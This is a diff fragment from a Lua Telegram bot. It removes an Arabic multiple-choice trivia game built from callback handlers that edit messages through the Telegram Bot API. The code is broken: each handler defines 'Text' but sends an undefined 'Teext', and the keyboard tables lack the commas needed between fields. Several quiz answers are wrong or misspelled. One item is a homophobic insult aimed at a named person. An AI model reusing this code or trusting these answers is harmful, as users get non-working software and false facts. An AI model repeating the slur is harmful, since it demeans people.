-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel111" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel112"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel112" then
-local Text =[[
-• العضو الذي يخزن السكر الزائد عن حاجة الجسم هو؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "البنكرياس " callback_data="✖"}},
-{{text = "الكبد" callback_data="mel113"}},
-{{text = "الكليه" callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel113" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel114"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel114" then
-local Text =[[
-• ماهو اول كائن صعد للفضاء؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "القرد" callback_data="mel115"}},
-{{text = "الكلب " callback_data="✖"}},
-{{text = "الانسان" callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel115" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel116"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel116" then
-local Text =[[
-• ما هي أكبر جزيرة في العالم؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "غينيا " callback_data="✖"}},
-{{text = "بورنيو" callback_data="❌"}},
-{{text = "غرينلاند" callback_data="mel117"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel117" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel118"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel118" then
-local Text =[[
-• كم يبلغ عدد أسنان الإنسان البالغ؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "30 سنه " callback_data="✖"}},
-{{text = "32 سنه" callback_data="mel119"}},
-{{text = "34 سنه" callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel119" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel120"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel120" then
-local Text =[[
-• ماذا يحدث لو اصبح احمد خول
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "ينهار التلجرام " callback_data="mel121"}},
-{{text = "يموت الكل" callback_data="mel121"}},
-{{text = "مستحييل" callback_data="mel121"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel121" then
-local Text =[[
-• ما العنصر الاساسي الموجود في الشمس؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "النيتروجين " callback_data="✖"}},
-{{text = "الكالسيوم" callback_data="❌"}},
-{{text = "الهيدروجين" callback_data="mel122"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel122" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel123"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel123" then
-local Text =[[
-• من هو الخليفة الذي فتح بلاد فارس؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "عمرو بن العاص رضي الله عنه " callback_data="✖"}},
-{{text = "عمر بن الخطاب رضي الله عنه" callback_data="mel124"}},
-{{text = "عمرو بن عبد العزيز رضي الله عنه" callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel124" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel125"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel125" then
-local Text =[[
-• من هو أول من وضع علم النحو؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الكسائي " callback_data="✖"}},
-{{text = "الجوهري" callback_data="❌"}},
-{{text = "ابو الاسد الدولي" callback_data="mel126"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel126" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "النهاية" callback_data="endmell"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "endmell" then
-local Text =[[
-تهانينا لقد انتهت اللعبه
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "اللعب مجددا" callback_data="mel1"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
 if Text == '/add' then
 if not Constructor(data) then
 local notText = '🚫 عذرا الاوامر هذه لا تخصك'
